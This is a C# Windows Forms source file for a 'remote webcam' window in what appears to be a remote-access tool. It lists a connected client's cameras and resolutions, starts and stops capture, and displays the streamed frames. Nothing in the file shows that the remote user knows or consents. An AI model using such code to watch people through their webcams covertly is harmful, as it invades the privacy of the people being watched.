using Serveur.Controllers.Server;
using Serveur.Packets.ServerPackets;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmRemoteWebcam : Form
    {
        public ClientMosaique client;
        private Dictionary<string, List<string>> _webcams;
        public bool IsStarted { get; private set; }

        public FrmRemoteWebcam(ClientMosaique client)
        {
            this.client = client;
            client.value.frmWbc = this;
            InitializeComponent();
        }

        private void FrmRemoteWebcam_Load(object sender, EventArgs e)
        {
            setToolStrip(false);
            new GetAvailableWebcams().Execute(client);
        }

        private void FrmRemoteWebcam_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (IsStarted == true)
                new StopWebcam().Execute(client);

            IsStarted = false;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            setToolStrip(true);
            this.ActiveControl = pbWebcam;
            new GetWebcam(cboResolutions.SelectedIndex, cboWebcams.SelectedIndex).Execute(client);
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            if (IsStarted == true)
             new StopWebcam().Execute(client);
            setToolStrip(false);
        }

        public void setToolStrip(bool state)
        {
            btnStart.Enabled = !state;
            cboWebcams.Enabled = !state;
            cboResolutions.Enabled = !state;
            btnStop.Enabled = state;
            IsStarted = state;
        }

        //CALLBACK
        public void AddWebcams(Dictionary<string, List<string>> webcams)
        {
            this._webcams = webcams;
            try
            {
                tsFrmWbc.Invoke((MethodInvoker)delegate
                {
                    foreach (var webcam in webcams.Keys)
                    {
                        cboWebcams.Items.Add(string.Format("{0}", webcam));
                    }
                    cboWebcams.SelectedIndex = 0;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void updateImage(Bitmap bmp, bool cloneBitmap = false)
        {
            pbWebcam.Image = new Bitmap(bmp, pbWebcam.Width, pbWebcam.Height);
        }

        // EVENTS
        private void cboWebcams_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                tsFrmWbc.Invoke((MethodInvoker)delegate
                {
                    cboResolutions.Items.Clear();

                    foreach (var resolution in this._webcams.ElementAt(cboWebcams.SelectedIndex).Value)
                    {
                        cboResolutions.Items.Add(string.Format("{0}", resolution));
                    }
                    cboResolutions.SelectedIndex = 0;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }
    }
}
